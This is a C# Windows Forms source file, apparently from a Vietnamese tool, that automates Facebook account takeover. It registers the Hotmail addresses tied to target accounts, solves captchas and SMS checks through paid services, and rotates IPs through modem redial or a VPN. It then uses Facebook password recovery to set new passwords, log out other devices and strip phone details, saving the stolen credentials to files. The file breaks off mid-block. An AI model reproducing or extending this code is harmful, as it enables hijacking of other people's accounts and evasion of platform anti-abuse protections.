using Anticaptcha_example.Api;
using Anticaptcha_example.Helper;
using Newtonsoft.Json.Linq;
using NPOI.HSSF.UserModel;
using NPOI.SS.UserModel;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using proSignUp;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Tool_Via;
using Tool_Via.Properties;
using xNet;
using Cookie = OpenQA.Selenium.Cookie;
using Keys = System.Windows.Forms.Keys;
using HttpRequest;
using maxcare;

namespace Maxcare
{
    public partial class mainForm : Form
    {
        private bool isStop = false;
        private Random rd = new Random();
        private string[] userAgents;
        public mainForm(string data)
        {
            InitializeComponent();
            userAgents = File.ReadAllLines("useragent.txt");
        }

        protected override void OnLoad(EventArgs args)
        {
            Application.Idle += this.OnLoaded;
        }

        private void OnLoaded(object sender, EventArgs e)
        {
            Application.Idle -= this.OnLoaded;
           // LoadCheck();
        }

        private void LoadCheck()
        {
            string idKey = Comon.GetIdKey();
            lblIdMachine.Text = idKey;
            string stt = Comon.CheckKeyAndLogin(Settings.Default.UserName, Settings.Default.PassWord, idKey);
            if (stt.Equals(""))
            {
                MessageBox.Show("Vui lòng kiểm tra lại kết nối!", "Thông báo", MessageBoxButtons.OK, MessageBoxIcon.Error);
                this.Close();
                return;
            }
            JObject objStt = JObject.Parse(stt);
            if (objStt["account"].ToString().Equals("True") && objStt["device"].ToString().Equals("True") && objStt["expried"].ToString().Equals("False"))
            {
                //lblStatus.Invoke((MethodInvoker)delegate ()
                //{
                //    lblStatus.Text = "Đã kích hoạt";
                //});
            }
            else
            {
                this.Invoke((MethodInvoker)delegate ()
                {
                    this.Hide();
                });
                int typeError = 0;
                //check account invalid
                if (Settings.Default.UserName.Equals("") || Settings.Default.PassWord.Equals("") || objStt["account"].ToString().Equals("False"))
                {
                    typeError = 1;
                }
                //not buy this software
                else if (objStt["device"].ToString().Equals("False"))
                {
                    typeError = 2;
                }
                //expried
                else if (objStt["expried"].ToString().Equals("True"))
                {
                    typeError = 3;
                }
                if (typeError != 0)
                {
                    fActive fa = new fActive(typeError, idKey);
                    fa.ShowInTaskbar = true;
                    fa.ShowDialog();
                }
            }
        }

        private void btnClose_Click(object sender, EventArgs e)
        {
            saveSetting();
            saveMail();
            try
            {
                KillProcessChromeDriver();
            }
            catch { }
            Environment.Exit(0);
        }

        private void saveMail()
        {
            try
            {
                List<string> arr = new List<string>();
                try
                {
                    for (int i = 0; i < dtgvChangeVia.RowCount; i++)
                    {
                        DataGridViewRow r = dtgvChangeVia.Rows[i];
                        string rt = (r.Cells[0].Value == null ? "False" : r.Cells[0].Value.ToString()) + "|" + (r.Cells[1].Value == null ? "" : r.Cells[1].Value.ToString()) + "|" + (r.Cells[2].Value == null ? "" : r.Cells[2].Value.ToString()) + "|" + (r.Cells[4].Value == null ? "" : r.Cells[4].Value.ToString()) + "|" + (r.Cells[5].Value == null ? "" : r.Cells[5].Value.ToString());
                        arr.Add(rt);
                    }
                }
                catch
                {

                }
                File.WriteAllLines("data.txt", arr);
            }
            catch { }
        }

        private void saveSetting()
        {
            Settings.Default.txbPasswordFb = txbPasswordFb.Text;
            Settings.Default.txbPasswordYahoo = txbPasswordYahoo.Text;
            Settings.Default.txbApiKeySimthue = txbApiKeySimthue.Text;
            Settings.Default.ckbRandomFacebook = ckbRandomFacebook.Checked;
            Settings.Default.ckbRandomMail = ckbRandomMail.Checked;
            int a = 0;
            if (rdNone.Checked)
                a = 0;
            else if (rdDcom.Checked)
                a = 1;
            else if (rdHma.Checked)
                a = 2;
            int b = 0;
            if (rdSimthue.Checked)
                b = 0;
            else
                b = 1;
            Settings.Default.typeChangeIp = a;
            Settings.Default.apiType = b;
            Settings.Default.nudThread = (int)nudThread.Value;
            Settings.Default.nudChangeIpCount = (int)nudChangeIpCount.Value;
            Settings.Default.ckbDeleteInfo = ckbDeleteInfo.Checked;
            Settings.Default.ckbLogoutDevice = ckbLogoutDevice.Checked;
            Settings.Default.ckbProfile = ckbProfile.Checked;
            Settings.Default.txbAnticaptcha = txbAnticaptcha.Text;
            Settings.Default.ckbShowIp = ckbShowIp.Checked;
            Settings.Default.txbTokenTemp = txbTokenTemp.Text;
            Settings.Default.txbCookieTemp = txbCookieTemp.Text;
            Settings.Default.Save();
        }

        private void btnMaximize_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Maximized)
            {
                this.WindowState = FormWindowState.Normal;
            }
            else
            {
                this.WindowState = FormWindowState.Maximized;
            }
        }

        private void btnMinimize_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        string[] profiles;
        private void BtnStart_Click(object sender, EventArgs e)
        {
            profiles = Directory.GetDirectories("profile");
            string[] accmailmains = File.ReadAllLines("accmailmain.txt");
            if (rdSimthue.Checked)
            {
                if (txbApiKeySimthue.Text == "")
                {
                    MessageBox.Show("Vui lòng nhập api key", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
            }

            bool isChecked = false;
            for (int i = 0; i < dtgvChangeVia.Rows.Count; i++)
            {
                if (Convert.ToBoolean(dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value))
                {
                    isChecked = true;
                    break;
                }
            }
            if (!isChecked)
            {
                MessageBox.Show("Vui lòng chọn một email", "Lỗi", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            DeleteImageCaptcha();
            int maxThread = Convert.ToInt32(nudThread.Value);
            int curThread = 0;
            int changeIpAfter = Convert.ToInt32(nudChangeIpCount.Value);
            int curChangeIp = 0;
            isStop = false;
            bool isDoneAll = true;
            if (ckbNoRegYahoo.Checked && accmailmains.Count() < maxThread)
            {
                MessageBox.Show("Số mail phải lớn hơn số luồng!!!");
                return;
            }
            if (ckbNoRegYahoo.Checked && profiles.Count() < maxThread)
            {
                MessageBox.Show("Số profile phải lớn hơn số luồng!!!");
                return;
            }
            rControl("start");
            //if (xemsex() == false)
            //{
            //    Shutdown();
            //}
            int indexlala = 0;
            new Thread(() =>
            {
                for (int i = 0; i < dtgvChangeVia.Rows.Count;)
                {
                    if (Convert.ToBoolean(dtgvChangeVia.Rows[i].Cells["cChoseMail"].Value))
                    {
                        while (isDoneAll == false)
                        {
                            Application.DoEvents();
                            Thread.Sleep(1000);
                            if (curThread <= 0)
                            {
                                if (curChangeIp >= changeIpAfter)
                                {
                                    ChangeIP();
                                    curChangeIp = 0;
                                }
                                Interlocked.Increment(ref curChangeIp);
                                isDoneAll = true;
                                indexlala = 0;
                            }
                        }
                        if (curThread < maxThread)
                        {
                            if (isStop)
                            {
                                break;
                            }
                            Interlocked.Increment(ref curThread);
                            int row = i;
                            new Thread(() =>
                            {
                                string accMail = "", prof = "";
                                lock (lockObj)
                                {
                                    accMail = accmailmains[indexlala];
                                    prof = profiles[indexlala];
                                    indexlala++;
                                }
                                RegAndChangeFacebook(row, accMail, prof);
                                dtgvChangeVia.Rows[row].Cells["cChoseMail"].Value = false;
                                Interlocked.Decrement(ref curThread);
                            }).Start();
                            i++;
                        }
                        else if (curThread <= 0)
                        {
                            isDoneAll = true;
                        }
                        else
                        {
                            isDoneAll = false;
                            Thread.Sleep(1000);
                        }
                    }
                    else
                    {
                        i++;
                    }
                    if (isStop)
                    {
                        break;
                    }
                }
                while (curThread > 0)
                {
                    Thread.Sleep(500);
                    Application.DoEvents();
                }
                rControl("stop");
            }).Start();
        }

        object lockObj = new object();
        private string DownloadImageByLink(string link)
        {
            string nameImage = rd.Next(1, 100).ToString();
            nameImage = CreateRandomNameImage();

            string name = @"data/" + nameImage + ".jpg";
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(new Uri(link), name);
            }
            return name;
        }

        private string ExampleImageToText(string path, string apikey)
        {
            string resole = "";
            DebugHelper.VerboseMode = true;

            var api = new ImageToText
            {
                ClientKey = apikey,
                FilePath = path
            };

            if (!api.CreateTask())
                resole = "";
            else if (!api.WaitForResult())
                resole = "";
            else
                resole = api.GetTaskSolution().Text;
            return resole;
        }

        private void LoadStatusGrid(string status, string colname, int rowIndex, int typeColor, DataGridView gv)
        {
            gv.Invoke(new Action(delegate ()
            {
                gv.Rows[rowIndex].Cells[colname].Value = status;
                //if (typeColor == 1)
                //{
                //    //inprogress
                //    dtgvChangeVia.Rows[rowIndex].DefaultCellStyle.BackColor = Color.LightYellow;
                //}
                //else if (typeColor == 2)
                //{
                //    //fail
                //    dtgvChangeVia.Rows[rowIndex].DefaultCellStyle.BackColor = Color.Orange;
                //}
                //else if (typeColor == 3)
                //{
                //    dtgvChangeVia.Rows[rowIndex].DefaultCellStyle.BackColor = Color.Tomato;
                //}
                //else if (typeColor == 4)
                //{
                //    dtgvChangeVia.Rows[rowIndex].DefaultCellStyle.BackColor = Color.SeaGreen;

                //}
            }));

        }

        private string RunCMD(string cmd)
        {
            Process cmdProcess;
            cmdProcess = new Process();
            cmdProcess.StartInfo.FileName = "cmd.exe";
            cmdProcess.StartInfo.Arguments = "/c " + cmd;
            cmdProcess.StartInfo.RedirectStandardOutput = true;
            cmdProcess.StartInfo.UseShellExecute = false;
            cmdProcess.StartInfo.CreateNoWindow = true;
            cmdProcess.Start();
            string output = cmdProcess.StandardOutput.ReadToEnd();
            cmdProcess.WaitForExit();
            if (String.IsNullOrEmpty(output))
                return "";
            return output;
        }

        private void ChangeIP()
        {
            if (rdNone.Checked)
            {

            }
            else if (rdDcom.Checked)
            {
                //Process cmdProcess = new Process();
                //cmdProcess.StartInfo.FileName = "connect.bat";
                //cmdProcess.StartInfo.UseShellExecute = false;
                //cmdProcess.Start();
                //Thread.Sleep(3000);
                //cmdProcess.WaitForExit();
                //Thread.Sleep(10000);
                string disconnect = RunCMD("Rasdial /disconnect");
                if (!disconnect.Contains("Command completed"))
                {
                    File.AppendAllText("ErrorLog.txt", "===" + DateTime.Now.ToString("dd/MM HH:mm:ss") + "===" + Environment.NewLine + disconnect + Environment.NewLine);
                }
                Thread.Sleep(3000);
                string telco = "";
                cbbTel.Invoke(new Action(delegate ()
                {
                    telco = cbbTel.Text;
                }));
                string connect = RunCMD("Rasdial " + telco);
                if (connect.Contains("modem was not found"))
                {
                    File.AppendAllText("ErrorLog.txt", "===" + DateTime.Now.ToString("dd/MM HH:mm:ss") + "===" + Environment.NewLine + connect + Environment.NewLine);
                    return;
                }
                Thread.Sleep(10000);
            }
            else if (rdHma.Checked)
            {
                string AppName = "HMA! Pro VPN";
                string AppFolder = @"C:\Program Files (x86)\HMA! Pro VPN\bin\";
                if (File.Exists(AppFolder + AppName + ".exe") == true)
                {
                    Process.Start(AppFolder + AppName + ".exe", "-disconnect");
                    Thread.Sleep(5000);
                    Process.Start(AppFolder + AppName + ".exe", "-connect");
                    Thread.Sleep(20000);
                }
            }
        }

        void Shutdown()
        {
            ManagementBaseObject mboShutdown = null;
            ManagementClass mcWin32 = new ManagementClass("Win32_OperatingSystem");
            mcWin32.Get();

            // You can't shutdown without security privileges
            mcWin32.Scope.Options.EnablePrivileges = true;
            ManagementBaseObject mboShutdownParams =
                     mcWin32.GetMethodParameters("Win32Shutdown");

            // Flag 1 means we want to shut down the system. Use "2" to reboot.
            mboShutdownParams["Flags"] = "1";
            mboShutdownParams["Reserved"] = "0";
            foreach (ManagementObject manObj in mcWin32.GetInstances())
            {
                mboShutdown = manObj.InvokeMethod("Win32Shutdown",
                                               mboShutdownParams, null);
            }
        }

        private string CreatePhoneApiSimthue(string service_id)
        {
            #region Khai báo request
            xNet.HttpRequest request = new xNet.HttpRequest();
            request.KeepAlive = true;
            request.Cookies = new CookieDictionary();
            request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
            request.UserAgent = Http.ChromeUserAgent();
            #endregion

            #region Tạo sđt
            string jsonCreate = request.Get("http://api.pvaonline.net/request/create?key=" + txbApiKeySimthue.Text + "&service_id=" + service_id).ToString();
            JObject objCreate = JObject.Parse(jsonCreate);
            string idRequest = "", phone = "";
            try
            {
                if (objCreate["success"].ToString().ToLower() == "true")
                {
                    idRequest = objCreate["id"].ToString();
                }
                else
                {
                    return "";
                }

                string jsonRead = request.Get("http://api.pvaonline.net/request/check?key=" + txbApiKeySimthue.Text + "&id=" + idRequest).ToString();
                JObject objRead = JObject.Parse(jsonRead);
                int timeStart = Environment.TickCount;

                do
                {
                    Thread.Sleep(5000);
                    if (Environment.TickCount - timeStart >= 95000)
                    {
                        return "";
                    }
                    try
                    {
                        phone = objRead["number"].ToString();
                        if (phone != "")
                            phone = phone.Substring(2);
                        else
                        {
                            jsonRead = request.Get("http://api.pvaonline.net/request/check?key=" + txbApiKeySimthue.Text + "&id=" + idRequest).ToString();
                            objRead = JObject.Parse(jsonRead);
                        }
                    }
                    catch
                    {

                    }
                } while (phone.Equals(""));
                if (phone != "")
                {
                    phone = phone + "|" + idRequest;
                }
            }
            catch
            {
            }
            #endregion
            return phone;
        }

        private string ReadOtpSimthue(string request_id)
        {
            #region Khai báo request
            xNet.HttpRequest request = new xNet.HttpRequest();
            request.KeepAlive = true;
            request.Cookies = new CookieDictionary();
            request.AddHeader(HttpHeader.Accept, "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            request.AddHeader(HttpHeader.AcceptLanguage, "en-US,en;q=0.5");
            request.UserAgent = Http.ChromeUserAgent();
            #endregion
            int timeStart = Environment.TickCount;
            string smsCode = ""; bool isHaveCode = false; string jsonRead = "";
            try
            {
                do
                {
                    Thread.Sleep(5000);
                    if (Environment.TickCount - timeStart >= 95000)
                    {
                        return "";
                    }
                    jsonRead = request.Get("http://api.pvaonline.net/request/check?key=" + txbApiKeySimthue.Text + "&id=" + request_id).ToString();
                    JObject objRead = JObject.Parse(jsonRead);
                    try
                    {
                        if (objRead["sms"].Count() > 0)
                        {
                            string data = objRead["sms"][0].ToString();
                            smsCode = Regex.Match(data.Split('|')[2], "\\d{4}").Value;
                            if (smsCode != "")
                                isHaveCode = true;
                        }
                    }
                    catch
                    {
                        return "";
                    }
                } while (isHaveCode == false);
            }
            catch
            {

            }

            return smsCode;
        }

        private void RegAndChangeFacebook(object dt, string accMailMain = "", string prof = "")
        {
            int i = (int)dt;
            ChromeDriver chrome = null;
            string uidIm = "";
            string passYahoo = txbPasswordYahoo.Text;
            string passFacebook = txbPasswordFb.Text;
            if (ckbRandomMail.Checked)
            {
                passYahoo = CreateRandomPassword();
            }
            if (ckbRandomFacebook.Checked)
            {
                passFacebook = CreateRandomPassword();
            }
            try
            {
                uidIm = dtgvChangeVia.Rows[i].Cells["cUidMail"].Value.ToString();
            }
            catch
            {

            }
            try
            {
                string email = dtgvChangeVia.Rows[i].Cells["cMailMail"].Value.ToString();
                string subemail = "";
                if (ckbShowIp.Checked)
                {
                    if (email.EndsWith("hotmail.com") || email.EndsWith("yahoo.com"))
                        LoadStatusGrid(GetIp(), "cIpMail", i, 1, dtgvChangeVia);
                }
                if (email.EndsWith("@hotmail.com"))
                {
                    LoadStatusGrid("Đang tạo Mail...", "cStatusMail", i, 1, dtgvChangeVia);
                    ChromeOptions options = new ChromeOptions();
                    options.AddArguments("--disable-extensions"); // to disable extension
                    options.AddArgument("--disable-notifications"); // to disable notification
                    options.AddArgument("--window-size=700,700");
                    options.AddArgument("--window-position=0,0");
                    options.AddArgument("--blink-settings=imagesEnabled=false");

                    if (ckbProfile.Checked)
                    {
                        if (uidIm != "")
                        {
                            string profilePath = @"profile/" + uidIm;
                            if (!Directory.Exists(profilePath))
                            {
                                Directory.CreateDirectory(profilePath);
                            }
                            options.AddArgument("--user-data-dir=" + profilePath);
                        }
                        else
                        {
                            dtgvChangeVia.Rows[i].Cells["cStatusMail"].Value = "Không có UID";
                            return;
                        }
                    }

                    ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                    service.HideCommandPromptWindow = true;
                    try
                    {
                        chrome = new ChromeDriver(service, options, TimeSpan.FromSeconds(120));
                    }
                    catch
                    {
                        chrome = new ChromeDriver(service, new ChromeOptions(), TimeSpan.FromSeconds(120));
                    }
                    chrome.Manage().Timeouts().ImplicitWait = TimeSpan.FromSeconds(5);
                    chrome.Manage().Timeouts().PageLoad = TimeSpan.FromSeconds(120);
                    IJavaScriptExecutor js = chrome as IJavaScriptExecutor;

                    chrome.Navigate().GoToUrl("https://signup.live.com/signup");
                    chrome.FindElementById("MemberName").SendKeys(email);
                    chrome.FindElementById("iSignupAction").Click();
                    Thread.Sleep(5000);
                    try
                    {
                        string err = (string)js.ExecuteScript("var a= document.querySelector('#MemberName').value;return a;");
                        if (err != "")
                        {
                            //if (err.Contains("already a Microsoft account"))
                            //{
                            LoadStatusGrid("Mail đã tồn tại!", "cStatusMail", i, 2, dtgvChangeVia);
                            chrome.Quit();
                            return;
                            //}
                        }
                    }
                    catch { }
                    try
                    {
                        chrome.FindElementById("iProofSignIn").Click();
                        LoadStatusGrid("Mail đã tồn tại!", "cStatusMail", i, 2, dtgvChangeVia);
                        chrome.Quit();
                        return;
                    }
                    catch { }
                    chrome.FindElementById("PasswordInput").SendKeys(passYahoo);
                    chrome.FindElementById("iSignupAction").Click();
                    Thread.Sleep(3000);
                    chrome.FindElementById("FirstName").SendKeys(TenVietNam().Trim());
                    chrome.FindElementById("LastName").SendKeys(HoVietNam().Trim());
                    chrome.FindElementById("iSignupAction").Click();
                    Thread.Sleep(3000);
                    js.ExecuteScript("document.getElementById('Country').value = \"VN\";");

                    try
                    {
                        chrome.FindElementById("BirthMonth").Click();
                        Thread.Sleep(1000);
                        chrome.FindElementByXPath("//*[@id=\"BirthMonth\"]/option[" + rd.Next(1, 12) + "]").Click();
                    }
                    catch
                    {
                        js.ExecuteScript("document.getElementById('BirthMonth').value =" + rd.Next(1, 12) + ";");
                    }

                    try
                    {
                        Thread.Sleep(1000);
                        chrome.FindElementById("BirthDay").Click();
                        Thread.Sleep(1000);
                        chrome.FindElementByXPath("//*[@id=\"BirthDay\"]/option[" + rd.Next(1, 28) + "]").Click();
                    }
                    catch
                    {
                        js.ExecuteScript("document.getElementById('BirthDay').value =" + rd.Next(2, 25) + ";");
                    }

                    try
                    {
                        Thread.Sleep(1000);
                        chrome.FindElementById("BirthYear").Click();
                        Thread.Sleep(1000);
                        chrome.FindElementByXPath("//*[@id=\"BirthYear\"]/option[" + rd.Next(19, 34) + "]").Click();
                        Thread.Sleep(1000);
                    }
                    catch
                    {
                        js.ExecuteScript("document.getElementById('BirthYear').value =" + rd.Next(1990, 2000) + ";");
                    }

                    //js.ExecuteScript("document.getElementById('BirthMonth').value =" + rd.Next(1, 12) + ";");
                    //js.ExecuteScript("document.getElementById('BirthDay').value =" + rd.Next(1, 28) + ";");
                    //js.ExecuteScript("document.getElementById('BirthYear').value =" + rd.Next(1990, 2000) + ";");
                    try
                    {
                        chrome.FindElementById("iSignupAction").Click();
                    }
                    catch
                    {
                        js.ExecuteAsyncScript("document.getElementById('iSignupAction').click();");
                    }
                    Thread.Sleep(5000);

                    string linksrc = "";
                    try
                    {
                        linksrc = chrome.FindElementByXPath("//*[@id=\"hipTemplateContainer\"]/div[1]/img").GetAttribute("src");
                    }
                    catch { }
                    //linksrc = capt.FindElement(By.TagName("img")).GetAttribute("src");
                    if (linksrc != "" && linksrc.Contains("hid"))
                    {
                        //var capt = chrome.FindElementById("hipTemplateContainer");
                        string filename = DownloadImageByLink(linksrc);
                        string captchcode = ExampleImageToText(filename, txbAnticaptcha.Text).Replace(" ", "");
                        //capt.FindElement(By.TagName("input")).SendKeys(captchcode);
                        chrome.FindElementByXPath("//*[@id=\"hipTemplateContainer\"]/div[3]/input").SendKeys(captchcode);
                        Thread.Sleep(1000);
                        try
                        {
                            chrome.FindElementById("iSignupAction").Click();
                        }
                        catch
                        {
                            js.ExecuteAsyncScript("document.getElementById('iSignupAction').click();");
                        }
                        Thread.Sleep(5000);
                    }
                    else
                    {
                        var capt = chrome.FindElementById("hipTemplateContainer");
                        string idSelect = capt.FindElement(By.TagName("select")).GetAttribute("id");
                        js.ExecuteScript("document.getElementById('" + idSelect + "').value = \"VN\";");
                        var idInputPhone = capt.FindElement(By.TagName("input"));
                        //if (rdSimthue.Checked)
                        //{

                        //}
                        string dataApi = CreatePhoneApiSimthue("21");
                        if (dataApi == "" || dataApi.Contains("|") == false)
                        {
                            LoadStatusGrid("Lỗi API!", "cStatusMail", i, 2, dtgvChangeVia);
                            chrome.Quit();
                            return;
                        }
                        string phone = dataApi.Split('|')[0];
                        string idRequest = dataApi.Split('|')[1];
                        idInputPhone.SendKeys(phone);
                        chrome.FindElementById("wlspispHipControlButtonsContainer").Click();
                        Thread.Sleep(2000);
                        #region Đọc OTP
                        int timeStart = Environment.TickCount;
                        string smsCode = "";
                        if (rdSimthue.Checked)
                        {
                            smsCode = ReadOtpSimthue(idRequest);
                        }
                        #endregion
                        if (smsCode != "")
                        {
                            chrome.FindElementByXPath("//*[@id=\"wlspispHipSolutionContainer\"]/div/input").SendKeys(smsCode);
                            Thread.Sleep(1000);
                            try
                            {
                                chrome.FindElementById("iSignupAction").Click();
                            }
                            catch
                            {
                                try
                                {
                                    js.ExecuteAsyncScript("document.getElementById('iSignupAction').click();");
                                }
                                catch { }
                            }
                        }
                        else
                        {
                            LoadStatusGrid("Lỗi đọc OTP!", "cStatusMail", i, 2, dtgvChangeVia);
                            chrome.Quit();
                            return;
                        }
                    }
                    Thread.Sleep(3000);
                    //reg success
                    if (chrome.Url.Contains("https://account.microsoft.com"))
                    {
                        LoadStatusGrid("Tạo mail thành công!", "cStatusMail", i, 1, dtgvChangeVia);
                        File.AppendAllText("account//hotmail.txt", email + "|" + passYahoo + "\r\n");
                        chrome.Url = "https://outlook.live.com/mail/inbox";
                        Thread.Sleep(4000);
                        chrome.Navigate().Refresh();
                        try
                        {
                            try
                            {
                                js.ExecuteScript("document.querySelector('body > section > div > div.dialog > section > button').click();");
                                Thread.Sleep(3000);
                                js.ExecuteScript("document.querySelector('body > section > div > div.dialog > section > button.iconButton.nextButton.lowerButton').click();");
                                Thread.Sleep(3000);
                                js.ExecuteScript("document.querySelector('body > section > div > div.dialog > section > button.iconButton.nextButton').click();");
                                Thread.Sleep(3000);
                                js.ExecuteScript("document.querySelector('body > section > div > div.dialog > section > button.iconButton.nextButton').click();");
                            }
                            catch { }

                            try
                            {
                                js.ExecuteScript("document.querySelector('body > section > div > div.dialog > section > button.iconButton.nextButton').click();");
                            }
                            catch { }
                            Thread.Sleep(10000);
                            try
                            {
                                try
                                {
                                    chrome.FindElementByXPath("/html/body/section/div/div[2]/section/section/section/div/button").Click();
                                }
                                catch { }
                                Thread.Sleep(5000);
                                if (chrome.Url == "https://outlook.live.com/mail/inbox")
                                {
                                    var buttonTabs = chrome.FindElementsByTagName("button").Where(x => x.GetAttribute("id").Contains("Pivot")).ToList();
                                    if (buttonTabs.Count > 0)
                                    {
                                        string idTab1 = "";
                                        for (int j = 0; j < buttonTabs.Count; j++)
                                        {
                                            if (buttonTabs[j].GetAttribute("id").Contains("Tab1"))
                                            {
                                                idTab1 = buttonTabs[j].GetAttribute("id");
                                            }
                                        }
                                        chrome.FindElementById(idTab1).Click();
                                    }

                                    try
                                    {
                                        js.ExecuteScript("window.open();");
                                    }
                                    catch
                                    {
                                        chrome.FindElement(By.CssSelector("body")).SendKeys(OpenQA.Selenium.Keys.Control + "t");
                                    }
                                    Thread.Sleep(1500);
                                    chrome.SwitchTo().Window(chrome.WindowHandles.Last());

                                    //change facebook
                                    chrome.Navigate().GoToUrl("https://www.facebook.com/login/identify/?ctx=recover&ars=royal_blue_bar");
                                    chrome.FindElementById("identify_email").SendKeys(email);
                                    chrome.FindElementByName("did_submit").Click();
                                    Thread.Sleep(4000);
                                    chrome.FindElementByName("reset_action").Click();

                                    string resetPassOTP = "";
                                    Thread.Sleep(1500);
                                    chrome.SwitchTo().Window(chrome.WindowHandles.First());
                                    LoadStatusGrid("Chờ OTP Mail...", "cStatusMail", i, 1, dtgvChangeVia);

                                    int timeStart = Environment.TickCount;
                                    bool isHaveCodeFb = false;
                                    do
                                    {
                                        if (Environment.TickCount - timeStart > 95000)
                                        {
                                            break;
                                        }
                                        try
                                        {
                                            var listItemMessage = chrome.FindElementsByTagName("div").Where(x => x.GetAttribute("id").Contains("AQAAAAAAA")).ToList();
                                            if (listItemMessage.Count > 0)
                                            {
                                                for (int j = 0; j < listItemMessage.Count; j++)
                                                {
                                                    string idMess = listItemMessage[j].GetAttribute("id");
                                                    string a = (string)js.ExecuteScript("var a= document.getElementById('" + idMess + "').getAttribute('aria-label');return a;");
                                                    if (a.Contains("Facebook"))
                                                    {
                                                        resetPassOTP = Regex.Match(a, @"\d{6}", RegexOptions.Singleline).Value;
                                                        isHaveCodeFb = true;
                                                    }
                                                }
                                            }
                                            Thread.Sleep(1000);
                                        }
                                        catch
                                        {
                                        }
                                    } while (isHaveCodeFb == false);

                                    if (isHaveCodeFb)
                                    {
                                        LoadStatusGrid("Đổi mật khẩu Facebook...", "cStatusMail", i, 1, dtgvChangeVia);
                                        chrome.SwitchTo().Window(chrome.WindowHandles.Last());
                                        Thread.Sleep(200);
                                        chrome.FindElementById("recovery_code_entry").SendKeys(resetPassOTP.Trim());
                                        Thread.Sleep(500);
                                        chrome.FindElementByName("reset_action").Click();
                                        Thread.Sleep(3000);
                                        if (ckbExport.Checked)
                                        {
                                            File.AppendAllText("linkreset.txt", chrome.Url+Environment.NewLine);
                                            LoadStatusGrid("Xong!", "cStatusMail", i, 1, dtgvChangeVia);
                                            chrome.Quit();
                                            return;
                                        }
                                        //change new pass
                                        chrome.FindElementById("password_new").SendKeys(passFacebook);
                                        try
                                        {
                                            chrome.FindElementById("btn_continue").Click();
                                        }
                                        catch
                                        {

                                        }
                                        Thread.Sleep(5000);
                                        if (chrome.Url.Contains("checkpoint"))
                                        {
                                            chrome.FindElementById("checkpointSubmitButton").Click();
                                            Thread.Sleep(10000);
                                            string cpstt = "Checkpoint: ";
                                            var listCp = chrome.FindElementsByName("verification_method").ToList();
                                            if (listCp.Count > 0)
                                            {
                                                for (int c = 0; c < listCp.Count; c++)
                                                {
                                                    string a = listCp[c].GetAttribute("value");
                                                    if (a == "3")
                                                        cpstt += "-Ảnh-";
                                                    else if (a == "2")
                                                        cpstt += "-Ngày sinh-";
                                                    else if (a == "20")
                                                    {
                                                        cpstt += "-Tin nhắn-";
                                                    }
                                                    else if (a == "4" || a == "34")
                                                    {
                                                        cpstt += "-Số Điện thoại-";
                                                    }
                                                    else if (a == "14")
                                                    {
                                                        cpstt += "-Thiết bị-";
                                                    }
                                                    else if (a == "26")
                                                    {
                                                        cpstt += "-Nhờ bạn bè-";
                                                    }
                                                }
                                            }
                                            LoadStatusGrid(cpstt, "cStatusMail", i, 3, dtgvChangeVia);
                                            File.AppendAllText("account//checkpoint.txt", uidIm + "|" + passFacebook + "|||" + email + "|" + passYahoo + "\r\n");
                                            chrome.Quit();
                                            return;
                                        }
                                        else
                                        {
                                            if (ckbLogoutDevice.Checked)
                                            {
                                                if (!chrome.Url.Contains("password/change/reason/"))
                                                {
                                                    chrome.Url = "https://www.facebook.com/password/change/reason/";
                                                }
                                                LoadStatusGrid("Đăng xuất thiết bị...", "cStatusMail", i, 1, dtgvChangeVia);
                                                try
                                                {
                                                    js.ExecuteScript("document.getElementById('u_0_3').click();");
                                                    Thread.Sleep(500);
                                                    var listbtn = chrome.FindElementsByTagName("button").Where(x => x.GetAttribute("value") == "1").ToList();
                                                    if (listbtn.Count > 0)
                                                    {
                                                        for (int r = 0; r < listbtn.Count; r++)
                                                        {
                                                            if (listbtn[r].GetAttribute("class").Contains("selected"))
                                                            {
                                                                listbtn[r].Click();
                                                                break;
                                                            }
                                                        }
                                                    }
                                                    Thread.Sleep(3000);
                                                }
                                                catch { }
                                            }
                                            chrome.Navigate().GoToUrl("https://www.facebook.com/profile");
                                            var cc = chrome.Manage().Cookies.AllCookies.ToArray();

                                            string uid = ""; bool isFindUid = false;
                                            try
                                            {
                                                foreach (OpenQA.Selenium.Cookie cookie in cc)
                                                {
                                                    if (cookie.Name == "c_user")
                                                    {
                                                        uid = cookie.Value;
                                                        isFindUid = true;
                                                    }
                                                }
                                            }
                                            catch { }
                                            if (isFindUid == false)
                                            {
                                                chrome.Navigate().GoToUrl("https://www.facebook.com/profile");
                                                Thread.Sleep(3000);
                                                try
                                                {
                                                    chrome.FindElementById("checkpointSubmitButton").Click();
                                                }
                                                catch { }
                                                string html = (string)js.ExecuteScript("var markup = document.documentElement.innerHTML;return markup;");
                                                uid = Regex.Match(html, "av=(.*?)\"").Groups[1].Value;
                                            }
                                            if (uid != "" && uid.Length < 25)
                                            {
                                                if (ckbDeleteInfo.Checked)
                                                {
                                                    chrome.Navigate().GoToUrl("https://www.facebook.com/settings?tab=mobile");
                                                    Thread.Sleep(500);
                                                    bool isHavePhone = true;
                                                    var tt = chrome.FindElementsByTagName("img").Where(x =>
                                                    {
                                                        try
                                                        {
                                                            if (x.GetAttribute("class").Equals("uiLoadingIndicatorAsync img"))
                                                                return true;
                                                            else
                                                                return false;
                                                        }
                                                        catch
                                                        {
                                                            return false;
                                                        };
                                                    }).ToList();
                                                    int countDeletePhone = 0;
                                                    do
                                                    {
                                                        if (tt.Count > 0)
                                                        {
                                                            string xp = FileXpathFromElement(js, tt[0]);
                                                            string idBtnRemove = Regex.Match(xp, "id\\(\"(.*?)\"\\)").Groups[1].Value;
                                                            if (!idBtnRemove.Equals(""))
                                                            {
